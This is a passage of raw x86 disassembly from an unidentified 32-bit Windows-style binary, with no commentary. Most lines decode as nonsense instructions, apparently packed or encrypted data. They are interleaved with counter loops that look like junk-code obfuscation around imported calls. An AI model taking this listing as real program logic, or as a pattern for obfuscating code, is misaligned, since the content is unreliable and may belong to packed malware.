  4017fb:	or     DWORD PTR [edx+0x66],esp
  4017fe:	and    DWORD PTR [ebp-0x42],esi
  401801:	enter  0x7ba0,0xc8
  401805:	push   ebp
  401806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401807:	xchg   ecx,eax
  401808:	sbb    eax,DWORD PTR [ecx]
  40180a:	sbb    esp,DWORD PTR [eax]
  40180c:	(bad)  
  40180d:	imul   ebp,DWORD PTR [edi],0x56f467bb
  401813:	mov    esp,0x6a6f40cb
  401818:	sbb    DWORD PTR [ebp+ecx*8-0x6a0b7fdd],esp
  40181f:	rcr    DWORD PTR [eax-0x4],0x14
  401823:	xchg   DWORD PTR [ecx+0x30],edi
  401826:	gs add al,0xf
  401829:	mov    edi,es
  40182b:	mov    ecx,0x6699f0b7
  401830:	cdq    
  401831:	jnp    0x401873
  401833:	stos   DWORD PTR es:[edi],eax
  401834:	out    0x15,al
  401836:	bound  ebx,QWORD PTR [ecx+0x4986b2b3]
  40183c:	bndstx [edx+edx*1+0x1ec52807],(bad)
  401844:	mov    WORD PTR [esi-0x62],es
  401847:	dec    esp
  401848:	(bad)  
  401849:	jne    0x401893
  40184b:	jmp    0x26a53174
  401850:	retf   
  401851:	data16 fdivr st(2),st
  401854:	pop    eax
  401855:	adc    al,0x2
  401857:	popf   
  401858:	xchg   DWORD PTR [edx+0x7e],edi
  40185b:	mov    dl,0xf7
  40185d:	inc    esp
  40185e:	imul   ecx,DWORD PTR [eax-0x4c],0x8bf54f17
  401865:	call   0xc1bb821b
  40186a:	inc    esi
  40186b:	mov    ch,0xa5
  40186d:	in     eax,dx
  40186e:	mov    ebp,0xf60db477
  401873:	popa   
  401874:	xchg   edx,eax
  401875:	out    dx,eax
  401876:	add    BYTE PTR [esi],dh
  401878:	loope  0x401862
  40187a:	xor    edi,DWORD PTR [edx-0x42]
  40187d:	push   ecx
  40187e:	jnp    0x40180e
  401880:	mov    esp,DWORD PTR [edx]
  401882:	mov    bl,0x5a
  401884:	mov    ss,WORD PTR ds:0xc8eeb4cf
  40188a:	or     DWORD PTR [esi-0x63dbded0],esi
  401890:	shr    ch,0x44
  401893:	sub    BYTE PTR [esi],0x11
  401896:	pop    ebp
  401897:	sbb    dl,dl
  401899:	mov    cl,0x5
  40189b:	js     0x4018b4
  40189d:	mov    esp,0xf17a5a0c
  4018a2:	mov    ch,0x72
  4018a4:	cmp    eax,0xafaa5f90
  4018a9:	inc    eax
  4018aa:	test   al,0xc
  4018ac:	xor    eax,0xe377624c
  4018b1:	jno    0x40183a
  4018b3:	lods   eax,DWORD PTR ds:[esi]
  4018b4:	mov    edx,DWORD PTR [ebx+0x9]
  4018b7:	stos   DWORD PTR es:[edi],eax
  4018b8:	jg     0x4018bd
  4018ba:	fsubp  st(3),st
  4018bc:	aaa    
  4018bd:	cmp    BYTE PTR [ebx],al
  4018bf:	mov    DWORD PTR [ecx+0x43383725],0x0
  4018c9:	add    cl,ch
  4018cb:	or     eax,0x8b000000
  4018d0:	sbb    eax,0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x78]
  401b2b:	push   cs
  401b2c:	xchg   esi,eax
  401b2d:	in     al,dx
  401b2e:	pop    esp
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401af4
  401b37:	mov    dl,0xbd
  401b39:	(bad)  
  401b3a:	into   
  401b3b:	mov    ebx,0x637eecf0
  401b40:	outs   dx,DWORD PTR ds:[esi]
  401b41:	cdq    
  401b42:	mov    ds:0x19841672,al
  401b47:	faddp  st(7),st
  401b49:	pop    eax
  401b4a:	push   ebx
  401b4b:	jns    0x401b2b
  401b4d:	push   0x9857b5be
  401b52:	mov    al,ds:0x3fc12775
  401b57:	ins    BYTE PTR es:[edi],dx
  401b58:	jno    0x401b7c
  401b5a:	aam    0x76
  401b5c:	adc    ecx,DWORD PTR [eax+ebx*4]
  401b5f:	(bad)  
  401b60:	sbb    al,0x8
  401b62:	xchg   ecx,eax
  401b63:	inc    ecx
  401b64:	imul   BYTE PTR [eax-0x16b1218]
  401b6a:	shl    DWORD PTR [ebp+0x48],0xaf
  401b6e:	pop    edi
  401b6f:	fld    QWORD PTR [ecx+edx*2-0x6cb12ae]
  401b76:	xor    bl,al
  401b78:	les    ebp,FWORD PTR [esp+eiz*8]
  401b7b:	dec    ebx
  401b7c:	cmp    al,0xf4
  401b7e:	dec    ecx
  401b7f:	xor    ebp,0x4
  401b82:	mov    ds:0x8049bd46,al
  401b87:	es inc edx
  401b89:	aam    0xfe
  401b8b:	jecxz  0x401c05
  401b8d:	jbe    0x401b65
  401b8f:	ret    0x4650
  401b92:	jo     0x401bb0
  401b94:	jne    0x401bfd
  401b96:	pop    es
  401b97:	sub    BYTE PTR [edi-0x28a7075f],0x57
  401b9e:	aad    0x66
  401ba0:	ret    0xfad7
  401ba3:	imul   ebp,DWORD PTR [eax],0x6dffee96
  401ba9:	clc    
  401baa:	inc    ebx
  401bab:	retf   0xceab
  401bae:	fidivr DWORD PTR [esi+0x22]
  401bb1:	stos   BYTE PTR es:[edi],al
  401bb2:	push   edi
  401bb3:	fcomi  st,st(4)
  401bb5:	xchg   esp,eax
  401bb6:	aas    
  401bb7:	sub    DWORD PTR [ecx+0x36fc47d0],ebx
  401bbd:	cs stos DWORD PTR es:[edi],eax
  401bbf:	lea    ebp,[ebp+0x7fbc5335]
  401bc5:	xor    eax,0xf69d6610
  401bca:	jmp    0x401c2c
  401bcc:	cmp    eax,0x8f8fa8bf
  401bd1:	in     eax,0xc4
  401bd3:	sub    ch,cl
  401bd5:	jne    0x401bd0
  401bd7:	cmp    edi,DWORD PTR [edi+0xe5852ca]
  401bdd:	jmp    0x401bff
  401bdf:	ja     0x401c5d
  401be1:	outs   dx,DWORD PTR ds:[esi]
  401be2:	clc    
  401be3:	mov    ecx,0x9843bc0d
  401be8:	lock cmp al,BYTE PTR [edx+0x6956632d]
  401bef:	in     eax,0x88
  401bf1:	(bad)  
  401bf2:	fbstp  TBYTE PTR [esi+esi*4+0x909fc96]
  401bf9:	(bad)  
  401bfb:	cmp    al,0xd2
  401bfd:	mov    ds:0xb3a4fbe,al
  401c02:	dec    esi
  401c03:	and    edx,DWORD PTR [edi-0x30]
  401c06:	mov    ebp,0x2671c930
  401c0b:	fsub   QWORD PTR [edi+eax*8-0x317d1dd1]
  401c12:	pop    edi
  401c13:	or     bl,BYTE PTR [edi]
  401c15:	imul   edi,DWORD PTR [edi-0x41c2281b],0xbe08352
  401c1f:	adc    al,0x34
  401c21:	je     0x401c61
  401c23:	mov    ch,0xe3
  401c25:	sar    BYTE PTR [ebx],cl
  401c27:	leave  
  401c28:	daa    
  401c29:	pop    es
  401c2a:	jp     0x401c58
  401c2c:	mov    dl,0xf0
  401c2e:	std    
  401c2f:	fwait
  401c30:	pop    esp
  401c31:	push   ebp
  401c32:	ret    
  401c33:	mov    bh,0x39
  401c35:	push   eax
  401c36:	mov    ah,0xdf
  401c38:	pop    edi
  401c39:	pop    eax
  401c3a:	fldenv [esi+0x31203ce6]
  401c40:	jg     0x401bd4
  401c42:	aas    
  401c43:	mov    al,ds:0x5fd81473
  401c48:	aad    0x62
  401c4a:	push   edx
  401c4b:	jl     0x401c20
  401c4d:	and    ah,ch
  401c4f:	push   cs
  401c50:	bound  esp,QWORD PTR [esi+0x55355265]
  401c56:	test   BYTE PTR [ecx-0xd],ch
  401c59:	(bad)  
  401c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c5b:	or     ecx,DWORD PTR [ecx]
  401c5d:	scas   al,BYTE PTR es:[edi]
  401c5e:	shl    BYTE PTR [edi-0x45],1
  401c61:	sub    edi,edx
  401c63:	fwait
  401c64:	and    esi,DWORD PTR [ecx+0x697d9c90]
  401c6a:	gs add ebx,edi
  401c6d:	ss mov bl,0x7a
  401c70:	hlt    
  401c71:	sub    esi,DWORD PTR [edi]
  401c73:	sub    ebp,DWORD PTR [ebp+0x52]
  401c76:	out    0x27,al
  401c78:	das    
  401c79:	push   0xfedbe149
  401c7e:	aaa    
  401c7f:	pop    eax
  401c80:	push   cs
  401c81:	rol    DWORD PTR [esi],0xa2
  401c84:	push   es
  401c85:	dec    esi
  401c86:	sub    al,0x76
  401c88:	cmp    bl,BYTE PTR [edx-0x2af2dc84]
  401c8e:	ins    DWORD PTR es:[edi],dx
  401c8f:	push   ds
  401c90:	stos   DWORD PTR es:[edi],eax
  401c91:	loop   0x401d03
  401c93:	int3   
  401c94:	mov    edx,0x15354f80
  401c99:	cwde   
  401c9a:	out    0x72,eax
  401c9c:	add    edx,ebx
  401c9e:	sbb    eax,0xc9a95e21
  401ca3:	add    BYTE PTR [ebp+0x41],dh
  401ca6:	jb     0x401ca5
  401ca8:	jecxz  0x401cff
  401caa:	enter  0x57a5,0xd8
  401cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401caf:	dec    esp
  401cb0:	arpl   WORD PTR [ecx+0x52c2d3fd],bx
  401cb6:	and    bh,al
  401cb8:	push   0x1444b813
  401cbd:	iret   
  401cbe:	xor    cl,BYTE PTR [eax+0x1b0c4dc2]
  401cc4:	xor    cl,BYTE PTR [ebx+0xe09ba2a]
  401cca:	inc    ebx
  401ccb:	jno    0x401d33
  401ccd:	in     al,dx
  401cce:	repz add DWORD PTR [ecx-0x20],esi
  401cd2:	addr16 imul esi,ecx,0xc1688235
  401cd9:	(bad)  
  401cdb:	mov    bh,0x92
  401cdd:	fwait
  401cde:	cdq    
  401cdf:	xor    eax,0xef0de1f7
  401ce4:	shr    BYTE PTR [ebx+0x5990622f],1
  401cea:	add    al,0xb1
  401cec:	sub    ch,BYTE PTR [esi]
  401cee:	jle    0x401c7f
  401cf0:	mov    bl,0x65
  401cf2:	sbb    al,0x9f
  401cf4:	jecxz  0x401cd8
  401cf6:	lods   al,BYTE PTR ds:[esi]
  401cf7:	pop    edi
  401cf8:	dec    ebx
  401cf9:	jno    0x401d2f
  401cfb:	loop   0x401d5c
  401cfd:	xchg   edi,eax
  401cfe:	ins    DWORD PTR es:[edi],dx
  401cff:	jl     0x401c9a
  401d01:	xor    ch,dh
  401d03:	sbb    edi,DWORD PTR [ebx]
  401d05:	sub    DWORD PTR [eax-0x73de3942],0x51e6fd95
  401d0f:	div    DWORD PTR [eax-0x1f2d0819]
  401d15:	push   cs
  401d16:	inc    edi
  401d17:	ins    BYTE PTR es:[edi],dx
  401d18:	mov    dh,0x3
  401d1a:	or     al,0xdf
  401d1c:	lods   eax,DWORD PTR ds:[esi]
  401d1d:	inc    ecx
  401d1e:	(bad)  
  401d1f:	(bad)  
  401d20:	sbb    cl,BYTE PTR ds:0x2ed89311
  401d26:	push   esi
  401d27:	xor    DWORD PTR [ecx],0xc9fd4458
  401d2d:	or     cl,ch
  401d2f:	sbb    DWORD PTR [edx+0x724e843a],ecx
  401d35:	retf   0x1a7c
  401d38:	inc    ecx
  401d39:	dec    esi
  401d3a:	pop    ds
  401d3b:	pusha  
  401d3c:	jae    0x401d06
  401d3e:	xor    ecx,DWORD PTR [esi]
  401d40:	xchg   ecx,eax
  401d41:	xor    eax,0xa0dfa67d
  401d46:	dec    edx
  401d47:	imul   BYTE PTR [ebp+0x13e12746]
  401d4d:	out    0xd9,al
  401d4f:	push   eax
  401d50:	in     eax,dx
  401d51:	mov    edi,0x8dddcf5
  401d56:	mov    ebx,DWORD PTR [edx-0x71]
  401d59:	adc    ch,bl
  401d5b:	fdivrp st(4),st
  401d5d:	sub    al,0x95
  401d5f:	mov    dh,0x40
  401d61:	add    al,0xdc
  401d63:	pop    dx
  401d65:	adc    al,BYTE PTR [esi-0x7f]
  401d68:	aas    
  401d69:	mov    esi,0x9a221393
  401d6e:	or     ebp,edi
  401d70:	xor    dl,bh
  401d72:	fstp   TBYTE PTR [ebx-0x58]
  401d75:	ja     0x401d15
  401d77:	ret    0xf32d
  401d7a:	ja     0x401d5d
  401d7c:	out    dx,eax
  401d7d:	dec    edx
  401d7e:	sbb    al,bh
  401d80:	mov    cl,0x3
  401d82:	inc    ecx
  401d83:	fcom   st(2)
  401d85:	popf   
  401d86:	mov    cl,0xd6
  401d88:	dec    esi
  401d89:	mov    ds:0x8f6283fe,eax
  401d8e:	(bad)  
  401d90:	icebp  
  401d91:	pop    ss
  401d92:	inc    ecx
  401d93:	(bad)  
  401d94:	sbb    ecx,DWORD PTR [esi+edi*1]
  401d97:	arpl   WORD PTR [edi+0x53c541e5],dx
  401d9d:	hlt    
  401d9e:	ins    BYTE PTR es:[edi],dx
  401d9f:	mov    dl,0x6c
  401da1:	ins    DWORD PTR es:[edi],dx
  401da2:	imul   ebp,DWORD PTR [ebp-0x57638717],0xd4596770
  401dac:	or     DWORD PTR ds:0x6913dab5,ebp
  401db2:	(bad)  
  401db3:	data16 arpl WORD PTR [edx+0x5276cc52],cx
  401dba:	dec    esp
  401dbb:	sub    DWORD PTR [ebp+0x19],ebx
  401dbe:	xchg   edx,eax
  401dbf:	ret    
  401dc0:	sbb    al,0xd5
  401dc2:	xlat   BYTE PTR ss:[ebx]
  401dc4:	dec    eax
  401dc5:	fst    QWORD PTR [edi+0x18]
  401dc8:	dec    ecx
  401dc9:	(bad)  
  401dca:	cld    
  401dcb:	mov    BYTE PTR [ebp+0x62],bh
  401dce:	inc    ebx
  401dcf:	jne    0x401d7b
  401dd1:	pusha  
  401dd2:	iret   
  401dd3:	mov    WORD PTR [eax+ebp*1],gs
  401dd6:	scas   al,BYTE PTR es:[edi]
  401dd7:	jbe    0x401e07
  401dd9:	mov    esp,0x128afeae
  401dde:	inc    ebx
  401ddf:	mov    edx,0xe057cc16
  401de4:	mov    esp,0x4309bbea
  401de9:	(bad)  
  401dea:	ins    DWORD PTR es:[edi],dx
  401deb:	shl    cl,0x25
  401dee:	int3   
  401def:	or     ah,ch
  401df1:	xchg   ebp,ebp
  401df3:	push   edi
  401df4:	push   ecx
  401df5:	jne    0x401e4b
  401df7:	stos   DWORD PTR es:[di],eax
  401df9:	ficomp DWORD PTR [eax+0x5d456b16]
  401dff:	lahf   
  401e00:	ficom  WORD PTR [edx+0x4e]
  401e03:	(bad)
  401e06:	retf   
  401e07:	call   DWORD PTR [ebp-0x6ff65739]
  401e0d:	fwait
  401e0e:	adc    al,0x82
  401e10:	xchg   ebp,eax
  401e11:	mov    dh,0x9c
  401e13:	jmp    0xb534:0x1fd982e
  401e1a:	xchg   edx,eax
  401e1b:	test   BYTE PTR [ebx+0x68],0x70
  401e1f:	inc    esi
  401e20:	push   0x90660411
  401e25:	push   es
  401e26:	dec    ecx
  401e27:	lea    ebp,[edi]
  401e29:	into   
  401e2a:	push   esp
  401e2b:	mov    bh,0x39
  401e2d:	test   eax,0x777aa255
  401e32:	call   0x91ea116a
  401e37:	shr    DWORD PTR [esi],1
  401e39:	ins    DWORD PTR es:[edi],dx
  401e3a:	mov    dh,0x0
  401e3c:	mov    gs,WORD PTR [ebp-0x76ea35f1]
  401e42:	in     al,dx
  401e43:	outs   dx,DWORD PTR ds:[esi]
  401e45:	je     0x401df0
  401e47:	pop    ds
  401e48:	mov    bh,0x19
  401e4a:	(bad)
  401e4d:	mov    bh,0x7
  401e4f:	lods   al,BYTE PTR ds:[esi]
  401e50:	lods   eax,DWORD PTR ds:[esi]
  401e51:	xor    al,0x4
  401e53:	inc    eax
  401e54:	(bad)  
  401e55:	(bad)  
  401e57:	jbe    0x401de4
  401e59:	or     DWORD PTR ds:0x6b35d644,esi
  401e5f:	pop    esi
  401e60:	pop    ebp
  401e61:	ins    DWORD PTR es:[edi],dx
  401e62:	jg     0x401dfd
  401e64:	adc    eax,0x8810ae47
  401e69:	jl     0x401ebb
  401e6b:	xor    ecx,DWORD PTR [esi+0x6c]
  401e6e:	cld    
  401e6f:	push   ss
  401e70:	xchg   edi,eax
  401e71:	inc    edx
  401e72:	imul   ecx,DWORD PTR ds:0xaad03571,0xffffffa4
  401e79:	(bad)  
  401e7b:	add    al,0xcf
  401e7d:	xor    eax,0x1b35add3
  401e82:	sbb    DWORD PTR [ebx+0x75a22b7a],ecx
  401e88:	fcompp 
  401e8a:	adc    al,0x2c
  401e8c:	pushw  ds
  401e8e:	rcr    DWORD PTR [eax+0x2b],cl
  401e91:	in     al,dx
  401e92:	out    0xe4,eax
  401e94:	data16 cli 
  401e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e97:	jns    0x401ed5
  401e99:	nop
  401e9a:	inc    esi
  401e9b:	into   
  401e9c:	jmp    0x401ed2
  401e9e:	push   edi
  401e9f:	and    al,0xac
  401ea1:	iret   
  401ea2:	xchg   ebx,eax
  401ea3:	mov    ah,0xb9
  401ea5:	out    dx,eax
  401ea6:	push   esi
  401ea7:	lahf   
  401ea8:	fwait
  401ea9:	push   0xbdace342
  401eae:	iret   
  401eaf:	mov    ebp,0xadb767c
  401eb4:	aas    
  401eb5:	sbb    edx,DWORD PTR [edx+0x27b2c906]
  401ebb:	mov    cl,0xc0
  401ebd:	push   0x78203c27
  401ec2:	xor    DWORD PTR [edi],esi
  401ec4:	push   cs
  401ec5:	push   0xe817e7a2
  401eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ecb:	push   ebp
  401ecc:	xchg   ebx,eax
  401ecd:	call   0xa802f57
  401ed2:	add    dh,BYTE PTR [ebx+eiz*2-0x7dac14a1]
  401ed9:	test   DWORD PTR [edi+0x46],ebp
  401edc:	jge    0x401e6c
  401ede:	xchg   esi,eax
  401edf:	test   al,0x5c
  401ee1:	mov    dl,0xff
  401ee3:	pop    esi
  401ee4:	mov    cl,0xf6
  401ee6:	jae    0x401e77
  401ee8:	lods   al,BYTE PTR ds:[esi]
  401ee9:	inc    esp
  401eea:	div    BYTE PTR [edi+0x1d235953]
  401ef0:	jl     0x401eeb
  401ef2:	jnp    0x401f64
  401ef4:	inc    eax
  401ef5:	std    
  401ef6:	jl     0x401f03
  401ef8:	jns    0x401f3d
  401efa:	push   edx
  401efb:	dec    esp
  401efc:	cmp    esp,0x25
  401eff:	or     edx,DWORD PTR ds:0xe7b3533a
  401f05:	xchg   edx,eax
  401f06:	mov    ecx,0x9cb36647
  401f0b:	mov    edi,gs
  401f0d:	(bad)  
  401f0e:	pop    ds
  401f0f:	fxch   st(7)
  401f11:	scas   eax,DWORD PTR es:[edi]
  401f12:	and    BYTE PTR [ecx-0xc227d3d],bh
  401f18:	cli    
  401f19:	loopne 0x401ea3
  401f1b:	cmp    eax,DWORD PTR [ebx+0x7d]
  401f1e:	jmp    0x401f24
  401f20:	imul   eax,DWORD PTR [esi-0x737d863c],0x8bc70344
  401f2a:	sbb    eax,0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	xchg   edi,eax
  401f5d:	xor    ecx,edi
  401f5f:	or     BYTE PTR [ebp+0x5],0x7e
  401f63:	jle    0x401fd4
  401f65:	jge    0x401fe5
  401f67:	jle    0x401f4e
  401f69:	sbb    BYTE PTR [ecx],dl
  401f6b:	xchg   edx,eax
  401f6c:	outs   dx,BYTE PTR ds:[esi]
  401f6d:	xchg   esi,eax
  401f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f6f:	cmp    BYTE PTR [ebx+0x945af1e],ah
  401f75:	add    eax,0x76079b31
  401f7a:	outs   dx,BYTE PTR ds:[esi]
  401f7b:	hlt    
  401f7c:	adc    esp,DWORD PTR [esi+0x2c]
  401f7f:	mov    cl,0x48
  401f81:	loopne 0x401f35
  401f83:	out    0x84,al
  401f85:	arpl   WORD PTR [edi+ebp*4+0x6f196cb1],ax
  401f8c:	test   al,0xa
  401f8e:	cmp    BYTE PTR [edx],cl
  401f90:	adc    al,0xb0
  401f92:	ins    BYTE PTR es:[edi],dx
  401f93:	sub    bl,al
  401f95:	das    
  401f96:	retf   
  401f97:	int3   
  401f98:	cmp    DWORD PTR [edi-0x1d],edx
  401f9b:	in     eax,0x32
  401f9d:	push   ebp
  401f9e:	xchg   ebx,eax
  401f9f:	aas    
  401fa0:	xchg   ecx,eax
  401fa1:	dec    edx
  401fa2:	xchg   ecx,eax
  401fa3:	into   
  401fa4:	jnp    0x401f94
  401fa6:	data16 mov ch,0x69
  401fa9:	inc    edx
  401faa:	and    eax,0x3daa257d
  401faf:	mov    ebx,0xd36007f8
  401fb4:	cmp    eax,0x38bd3d85
  401fb9:	pop    ecx
  401fba:	jg     0x402035
  401fbc:	call   0x8638:0x3af3d9ef
  401fc3:	pop    es
  401fc4:	inc    esi
  401fc5:	lock push 0x1e
  401fc8:	sub    al,0x2e
  401fca:	mov    DWORD PTR [edx-0x3ec92e33],ebp
  401fd0:	nop
  401fd1:	or     DWORD PTR [ecx+0x8],edi
  401fd4:	popa   
  401fd5:	in     al,0xad
  401fd7:	xchg   edx,eax
  401fd8:	lods   al,BYTE PTR ds:[esi]
  401fd9:	popa   
  401fda:	mov    esp,0x965af1d
  401fdf:	stc    
  401fe0:	addr16 ret 
  401fe2:	mov    edx,0x5203d5bc
  401fe7:	pop    esi
  401fe8:	fmul   QWORD PTR fs:[esi]
  401feb:	adc    al,0x4a
  401fed:	mov    bl,0x8
  401fef:	sbb    DWORD PTR [edx+0x4b],ecx
  401ff2:	pop    esp
  401ff3:	test   BYTE PTR [edi],dl
  401ff5:	sub    BYTE PTR [ebx],cl
  401ff7:	xor    ah,bl
  401ff9:	mov    al,ds:0x698b41d0
  401ffe:	mov    ds:0x5e2fb7c9,eax
  402003:	arpl   sp,si
  402005:	mov    ecx,DWORD PTR [edx]
  402007:	xor    al,0x6
  402009:	push   ebp
  40200a:	loope  0x40205a
  40200c:	sahf   
  40200d:	jle    0x401ff2
  40200f:	jg     0x402059
  402011:	out    0x19,al
  402013:	add    bh,0x23
  402016:	mov    edx,0xf0e88cc
  40201b:	xor    ah,al
  40201d:	inc    eax
  40201e:	xor    esp,DWORD PTR [eax+edx*2+0x7d]
  402022:	jg     0x401fc4
  402024:	cmp    eax,0xa6b84dbc
  402029:	push   edi
  40202a:	hlt    
  40202b:	data16 add bh,BYTE PTR ds:0xa78088e8
  402032:	mov    bh,0x59
  402034:	mov    ecx,0xd299fff4
  402039:	mov    ebx,DWORD PTR [edi+0x3137445a]
  40203f:	pop    edi
  402040:	call   0x7a53:0xac8976ff
  402047:	mov    bl,0x8
  402049:	push   esp
  40204a:	fsub   QWORD PTR [esi+0x52]
  40204e:	jmp    0x40202e
  402050:	sbb    ebp,ecx
  402052:	add    al,0x3a
  402054:	shr    DWORD PTR [ecx],cl
  402056:	enter  0xd186,0x41
  40205a:	pop    ebx
  40205b:	icebp  
  40205c:	mov    ch,0xab
  40205e:	or     al,0xb7
  402060:	jae    0x40200b
  402062:	aas    
  402063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402064:	(bad)  
  402066:	or     BYTE PTR [ecx+0x6e],ah
  402069:	cld    
  40206a:	stos   DWORD PTR es:[edi],eax
  40206b:	mulps  xmm3,XMMWORD PTR [eax]
  40206e:	jl     0x4020a6
  402070:	sbb    BYTE PTR [ebx+eax*4-0x72a06da1],ch
  402077:	cli    
  402078:	ret    0xec79
  40207b:	adc    al,0xa5
  40207d:	aas    
  40207e:	inc    edx
  40207f:	ja     0x40209c
  402081:	inc    edi
  402082:	lds    edx,FWORD PTR [edi]
  402084:	or     al,0xb1
  402086:	cmc    
  402087:	dec    edx
  402088:	jmp    0xc743b035
  40208d:	stos   DWORD PTR es:[edi],eax
  40208e:	add    BYTE PTR [ecx+edi*8],dl
  402091:	int3   
  402092:	mov    al,ah
  402094:	jecxz  0x4020cc
  402096:	pop    es
  402097:	(bad)  
  402098:	inc    ecx
  402099:	loop   0x402037
  40209b:	out    0x40,eax
  40209d:	arpl   si,di
  40209f:	pop    eax
  4020a0:	test   eax,0x3414b8f6
  4020a5:	jbe    0x40211d
  4020a7:	(bad)  
  4020a8:	std    
  4020a9:	(bad)  
